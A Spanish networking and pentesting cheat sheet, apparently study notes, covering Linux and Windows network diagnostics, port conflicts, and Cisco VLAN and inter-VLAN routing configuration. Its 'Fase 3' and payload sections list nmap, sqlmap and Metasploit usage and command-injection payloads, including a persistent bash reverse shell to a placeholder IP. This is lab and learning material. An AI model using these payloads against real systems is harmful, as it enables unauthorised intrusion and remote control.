# Guía de Comandos: Redes, Puertos y Seguridad

## Fase 1: Reconocimiento Básico

| Tarea                  | Linux / macOS               | Windows             | Función y Desglose de Opciones                       |
|------------------------|----------------------------|---------------------|-----------------------------------------------------|
| Ver mi propia IP y MAC | `ip a` / `ifconfig`        | `ipconfig /all`     | Muestra IP, MAC, DNS. `/all` = todo                 |
| Verificar si una IP responde | `ping [IP]`            | `ping [IP]`         | `-c [num]` (Linux), `-t` (Win)                      |
| Trazar ruta a un destino | `traceroute [IP]`          | `tracert [IP]`      | `-n` (Lnx), `-d` (Win)                              |
| Ver tabla de vecinos    | `ip n` / `arp -a`          | `arp -a`            | Muestra tabla ARP                                   |
| Descubrir hosts locales | `sudo nmap -sn [Rango]`    | `nmap -sn [Rango]`  | `-sn` = Ping Scan                                   |
| Consultar info dominio  | `whois [dominio]`          | `whois [dominio]`   | Registro público                                    |
| Consultar DNS           | `nslookup` / `dig`          | `nslookup`           | `dig -x`, `dig [dominio] MX`                        |

---

## Tabla 1B: Comandos de Configuración de Red del Host (Linux desactivar DHCP para asignar IP manual).

| Tarea                                 | Comando / Método                                        | Función y Notas Clave                                                                                     |
|--------------------------------------|--------------------------------------------------------|-----------------------------------------------------------------------------------------------------------|
| 1. Ver Nombres de Interfaz            | `ip a`                                                 | Paso previo esencial. Muestra los nombres de tus interfaces (ej: eth0, enp0s3) para usarlos en siguientes comandos. |
| 2. Asignar IP Temporal (Moderno)     | `sudo ip addr add [IP]/[CIDR] dev [interfaz]`          | Asigna una IP que se pierde al reiniciar. Ideal para pruebas rápidas. Ej: `192.168.1.150/24 dev eth0`.    |
| 3. Asignar IP Temporal (Clásico)     | `sudo ifconfig [interfaz] [IP] netmask [Máscara]`      | Método antiguo, también se pierde al reiniciar.                                                           |
| 4. Asignar IP Permanente (Sistemas antiguos con interfaces) | `sudo nano /etc/network/interfaces` | Edita archivo tradicional. Añadir líneas:<br/>`iface [interfaz] inet static`<br/>`address [IP]`<br/>`netmask [Máscara]`<br/>`gateway [Gateway]` |
| 5. Asignar IP Permanente (Sistemas modernos con netplan)   | 1. `ls /etc/netplan/`<br/>2. `sudo nano /etc/netplan/[archivo].yaml`<br/>3. `sudo netplan apply` | Método estándar en Ubuntu moderno.<br/>1. Encuentra archivo `.yaml`.<br/>2. Edítalo para IP estática.<br/>3. Aplica cambios permanentes. |

---

## Glosario de Opciones (flags).

### Para ipconfig (Windows)
- `/all` → Muestra toda la configuración de todas las interfaces, incluyendo Dirección Física (MAC), DNS, estado DHCP y lease.

### Para ping
- `-c [número]` (Linux/macOS) → Número de paquetes a enviar. Sin esto, ping en Linux corre indefinidamente.
- `-t` (Windows) → Envía paquetes hasta que se detenga (till stopped), similar a ping por defecto en Linux.
- `-n [número]` (Windows) → Número de solicitudes a enviar (equivale a `-c` en Linux).

### Para traceroute (Linux/macOS) y tracert (Windows)
- `-n` (Linux/macOS) → Muestra IPs de saltos en formato numérico, sin resolver nombres.
- `-d` (Windows) → No resuelve direcciones a nombres de host (equivalente a `-n` en Linux).

### Para arp
- `-a` → Muestra todas las entradas actuales en la tabla ARP.
- `-n` (Linux/macOS) → Muestra entradas en formato numérico.

### Para nmap
- `-s` → Especifica tipo de escaneo.
- `-n` → Sin resolución de nombres DNS.
- `-sn` → Ping Scan (Scan No ports), detecta hosts activos sin escanear puertos.

### Para dig (Linux/macOS)
- `-x [IP]` → Búsqueda DNS inversa (busca dominio asociado a IP).

---

## Tabla Maestra de Conflictos de Puertos

| Puerto | Desarrollo Web y Datos               | Herramientas de Ataque / Apps Vulnerables | Herramientas de Defensa / Monitoreo y Ops |
|--------|------------------------------------|--------------------------------------------|--------------------------------------------|
| 3000   | React, Next.js, Vue, Node.js, Express.js | OWASP Juice Shop                          | Grafana, Advisor                          |
| 8080   | Tomcat, Servidores Java             | OWASP ZAP, Burp Suite, Web Goat             | Kibana, Jenkins, Apache Guacamole          |
| 8000   | Django, Gunicorn, Jupyter Notebook | —                                          | Kong(proxy), Portainer(HTTP), Splunk       |
| 5000   | Flask, Streamlit                   | Empire, Starkiller(API)                      | —                                          |
| 9200   | —                                  | —                                          | Elasticsearch                              |
| 5601   | —                                  | —                                          | Kibana                                     |
| 9000   | —                                  | —                                          | TheHive                                    |
| 8001   | —                                  | —                                          | Kong (Admin API)                           |
| 8443   | —                                  | —                                          | Kong (HTTPS Proxy)                         |
| 8444   | —                                  | —                                          | Kong (HTTPS Admin API)                     |
| 9090   | —                                  | —                                          | Prometheus                                 |
| 9443   | —                                  | —                                          | Portainer (HTTPS)                          |
| 19999  | —                                  | —                                          | Netdata                                    |
| 16686  | —                                  | —                                          | Jaeger UI                                  |
| 14268  | —                                  | —                                          | Jaeger Collector                           |

---

## Fase 2: Análisis de Puertos, Procesos y Servicios

| Tarea                                      | Linux / macOS                     | Windows                           | Función y Desglose de Opciones Clave                        |
|--------------------------------------------|---------------------------------|---------------------------------|-------------------------------------------------------------|
| Vista General: Ver todas conexiones y puertos (TCP/UDP) | `sudo ss -tunap` o `sudo netstat -tunap` | `netstat -ano`                 | Muestra lista completa de conexiones y puertos.             |
| Diagnóstico Clave: Ver solo servicios en escucha (LISTEN) | `sudo ss -tuln` o `sudo netstat -tuln` | `netstat -ano | findstr "LISTENING"` | Ver servicios activos en la máquina.                        |
| Filtrado por Estado: Ver solo conexiones activas y establecidas | `ss -tn state established` o `netstat -tn | grep ESTABLISHED` | `netstat -an | findstr "ESTABLISHED"` | Muestra conexiones en uso, ignora puertos esperando.       |
| Filtrado por Protocolo: Ver solo sockets UDP | `ss -uan` o `netstat -anu`      | `netstat -anu`                   | Aísla tráfico UDP (DNS, DHCP, streaming).                   |
| Acción Principal: Buscar proceso que usa un puerto | `sudo ss -tulnp | grep [PUERTO]` | `netstat -ano | findstr "[PUERTO]"` | Obtiene PID del proceso que ocupa el puerto.                |
| Paso Final: Liberar puerto matando proceso | `sudo kill -9 [PID]`             | `taskkill /PID [PID] /F`        | Libera puerto a la fuerza.                                  |
| Investigación 1: Ver nombre proceso por PID | `ps -p [PID] -o comm=`          | `tasklist /FI "PID eq [PID]"`   | Muestra programa a matar antes de usar kill.               |
| Investigación 2: Buscar sockets por nombre proceso | `lsof -c [nombreProceso]`       | 1. `tasklist | findstr "[proceso]"`<br/>2. `netstat -ano | findstr "[PID]"` | Flujo en Windows útil si sabes nombre programa pero no puerto. |
| Verificación Remota: Probar si puerto abierto en otro host | `telnet [IP] [PUERTO]`          | `telnet [IP] [PUERTO]`          | Prueba conectividad. Pantalla negra = abierto; error = cerrado.|

---

## Glosario de Opciones (flags).

### Para ss / netstat (Linux)
- `-t` → Solo sockets TCP.
- `-u` → Solo sockets UDP.
- `-l` → Solo puertos "escucha" (Listening).
- `-n` → Mostrar direcciones y puertos en formato numérico.
- `-p` → Mostrar proceso (PID y nombre) que usa socket.
- `-a` → Todos los sockets (escucha y no).

### Para netstat (Windows)
- `-a` → Todos los sockets y puertos en escucha.
- `-n` → Direcciones y puertos en formato numérico.
- `-o` → Mostrar PID dueño asociado.
- `-u` → Solo sockets UDP (con `-a`).

### Para kill (Linux)
- `-9` (SIGKILL) → Señal incondicional para matar proceso.

### Para taskkill (Windows)
- `/PID [número]` → PID a terminar.
- `/F` → Forzar terminación.

### Para lsof (Linux)
- `-c [nombre]` → Archivos abiertos por comandos que empiezan con [nombre].

---

## Fase 3: Escaneo y Explotación

| Tarea             | Herramienta | Función y Desglose de Opciones                 |
|-------------------|-------------|-----------------------------------------------|
| Escaneo Profundo  | nmap        | `-sS`, `-sV`, `-O`, `-p-`, `-A`               |
| Vulnerabilidades Web | nikto      | `-h`: especifica host                         |
| Inyección SQL     | sqlmap      | `-u`, `--dbs`, `--batch`                       |
| Explotación       | msfconsole  | `search`, `use`, `set RHOSTS`, `exploit`      |

---

## Glosario de Opciones (Flags/Parámetros) Usadas en Fase 3

### Para nmap (Network Mapper)
- `-sS` → SYN Scan (escaneo sigiloso, rápido, no completa conexión TCP).
- `-sV` → Detección de versión de servicios.
- `-O` → Detección del sistema operativo.
- `-p-` → Escanea todos puertos (1-65535).
- `-A` → Escaneo agresivo (combina `-sV`, `-O`, traceroute, scripts).

### Para nikto (Escáner web)
- `-h [URL/IP]` → Host objetivo a escanear.

### Para sqlmap (Inyección SQL)
- `-u "[URL]"` → URL objetivo para prueba.
- `--dbs` → Enumera bases de datos tras vulnerabilidad confirmada.
- `--batch` → Modo no interactivo (acepta opciones por defecto).

### Para msfconsole (Metasploit)
- `search [término]` → Buscar módulos.
- `use [ruta_módulo]` → Seleccionar módulo.
- `set RHOSTS [IP]` → Establecer IP objetivo.
- `exploit` → Ejecutar módulo.

---

## Payloads de Inyección de Comandos

| Payload de Ejemplo                                            | Función                                                        |
|---------------------------------------------------------------|----------------------------------------------------------------|
| `127.0.0.1; whoami`                                           | Ver usuario del proceso                                        |
| `127.0.0.1; uname -a`                                         | Ver info sistema                                              |
| `127.0.0.1 && id`                                             | Ejecuta ver usuario/grupo si anterior tuvo éxito             |
| `127.0.0.1; sleep 4 && echo "test"`                           | Blind injection por tiempo                                     |
| `127.0.0.1; php -r 'echo "Max execution time: " . ini_get("max_execution_time");'` | Ejecuta código PHP para ver tiempo máximo de ejecución de scripts |
| `127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/IP/PUERTO 0>&1' &` | Reverse shell persistente en segundo plano                    |

---

## Comandos Post-Explotación Básicos

| Comando           | Función                                           |
|-------------------|--------------------------------------------------|
| `ls`              | Lista archivos y directorios en ubicación actual |
| `cat [archivo]`   | Muestra contenido de archivo (flags, contraseñas)|

---

## Fase 4: Configuración de Dispositivos Cisco (CLI)

### Parte A: Fundamentos de la CLI de Cisco
#### A1. Modos de Comando del IOS

| Modo                 | Prompt Típico   | Propósito Principal                  |
|----------------------|-----------------|------------------------------------|
| EXEC del Usuario      | `Router>`       | Vista limitada, comandos básicos.  |
| EXEC Privilegiado     | `Router#`       | Acceso completo ("admin").          |
| Configuración Global  | `Router(config)#` | Cambios que afectan a todo el dispositivo. |
| Configuración de Interfaz | `Router(config-if)#` | Configurar interfaz específica.  |

---

#### A2. Navegación y Ayuda en la CLI

| Tarea                      | Comando / Tecla         | Función TL;DR                             |
|----------------------------|------------------------|-------------------------------------------|
| Entrar a modo privilegiado  | `enable`               | `Router>` → `Router#`                      |
| Entrar a modo configuración | `configure terminal` o `conf t` | `Router#` → `Router(config)#`       |
| Salir un nivel             | `exit`                 | `(config-if)#` → `(config)#`               |
| Obtener ayuda contextual    | `?`                    | Muestra comandos/opciones disponibles.    |
| Completar un comando        | `Tab`                  | Autocompleta un comando.                    |

---

### Parte B: Configuración Básica Dispositivos y VLANs en Switch
#### B1. Pasos Esenciales de Configuración Inicial (Switch/Router)


| Paso | Comando(s) de Ejemplo (desde (config)#)           | Propósito                                      |
|-------|--------------------------------------------------|------------------------------------------------|
| 1     | `hostname SW1`                                   | Asigna un nombre único y descriptivo.          |
| 2     | `enable secret [contraseña_fuerte]`              | Establece la contraseña cifrada para enable.   |
| 3     | `line console 0`<br/>`password [contraseña]`<br/>`login` | Asegura el acceso físico al puerto de consola.  |
| 4     | `copy running-config startup-config` (en modo #) | Crucial: Guarda los cambios para que persistan.|



#### B2. Configuración de VLANs en el Switch

| Tarea                          | Comando(s)                                                     | Modo           | Función TL;DR                              |
|--------------------------------|---------------------------------------------------------------|----------------|--------------------------------------------|
| Crear y nombrar una VLAN        | `vlan [número]`<br/>`name [nombre_vlan]`                      | `(config)#`    | Crea VLAN y le asigna nombre.               |
| Asignar puerto a VLAN (Acceso) | `interface [nombre_puerto]`<br/>`switchport mode access`<br/>`switchport access vlan [número]` | `(config)#`    | Conecta dispositivo a VLAN específica.     |
| Configurar puerto Troncal (Trunk) | `interface [nombre_puerto]`<br/>`switchport mode trunk`        | `(config)#`    | Conecta switch/router, permite múltiples VLANs. |

---

### Parte C: Configuración de Enrutamiento Inter-VLAN (Router on a Stick)

Este método utiliza un router y un único enlace troncal para enrutar el tráfico entre múltiples VLANs.

| Tarea                      | Comando(s)                                          | Modo             | Función TL;DR                                 |
|----------------------------|----------------------------------------------------|------------------|-----------------------------------------------|
| 1. Activar interfaz física | `interface [nombre_interfaz]`<br/>`no shutdown`   | `(config)#`      | Enciende puerto físico del router (sin IP).  |
| 2. Crear Subinterfaz VLAN  | `interface [nombre_interfaz].[sub-id]`             | `(config)#`      | Crea interfaz virtual para VLAN.              |
| 3. Asignar VLAN y Encapsulación | `encapsulation dot1q [número_vlan]`               | `(config-subif)#` | Define etiqueta VLAN (dot1q) para subinterfaz. |
| 4. Asignar IP a Subinterfaz | `ip address [IP_gateway] [Máscara]`                | `(config-subif)#` | IP para gateway de dispositivos VLAN.         |

**Ejemplo VLAN 10:**

R1(config)# interface gigabitethernet 0/0.10
R1(config-subif)# encapsulation dot1q 10
R1(config-subif)# ip address 192.168.10.1 255.255.255.0
Se repiten los pasos 2, 3 y 4 para cada VLAN que necesite enrutamiento.

---

### Parte D: Diagnóstico y Verificación
#### D1. Comandos show Fundamentales

| Tarea                       | Comando show                | Modo         | Función TL;DR                                         |
|-----------------------------|-----------------------------|--------------|-------------------------------------------------------|
| Resumen rápido interfaces    | `show ip interface brief`  | `#`          | Muestra IPs y estado (up/up o down/down).             |
| Estado físico de puertos     | `show interfaces status`   | `#`          | Muestra estado, VLAN, dúplex, velocidad.              |
| Resumen VLANs y puertos      | `show vlan brief`          | `#`          | Muestra VLANs y puertos asociados.                     |
| Ver puertos troncales        | `show interfaces trunk`    | `#`          | Lista puertos en modo trunk y VLANs permitidas.       |
| Ver modo puerto específico   | `show interfaces [puerto] switchport` | `#` | Muestra modo access/trunk y detalles.                  |
| Ver tabla MAC del switch     | `show mac address-table`   | `#`          | Muestra MACs aprendidas, puerto y VLAN.                |
| Ver estado Spanning-Tree     | `show spanning-tree`       | `#`          | Info protocolo que previene bucles.                    |
| Ver tabla enrutamiento       | `show ip route`            | `#`          | Confirma rutas conocidas por router.                   |

---

#### D2. Interpretación Tabla Enrutamiento (show ip route)

Este comando es crucial para verificar que el router conoce las rutas a las diferentes redes, incluidas las VLANs. Entender los códigos de origen es fundamental.

| Código | Significado | Descripción                                      |
|--------|-------------|-------------------------------------------------|
| L      | Local       | IP asignada a interfaz del router (ruta host). |
| C      | Conectada   | Red directamente conectada a interfaz activa.  |
| S      | Static      | Ruta estática configurada manualmente.          |
| O      | OSPF        | Ruta aprendida por protocolo OSPF.               |
| D      | DUAL (EIGRP)| Ruta aprendida por EIGRP.                         |
| R      | RIP         | Ruta aprendida por RIP.                           |
| B      | BGP         | Ruta aprendida por BGP.                           |
| S*     | Ruta Estática Candidata a Predeterminada | Ruta estática 0.0.0.0/0 puerta de enlace por defecto.|

**Aplicación Inter-VLAN:**

- Cada subinterfaz para VLAN es una red conectada.
- En tabla verás:
  - `C` para red VLAN (ej: `C 192.168.10.0/24 is directly connected, GigabitEthernet0/0.10`)
  - `L` para IP gateway VLAN (ej: `L 192.168.10.1/32 is directly connected, GigabitEthernet0/0.10`)

Estas entradas confirman que enrutamiento Inter-VLAN funciona correctamente.
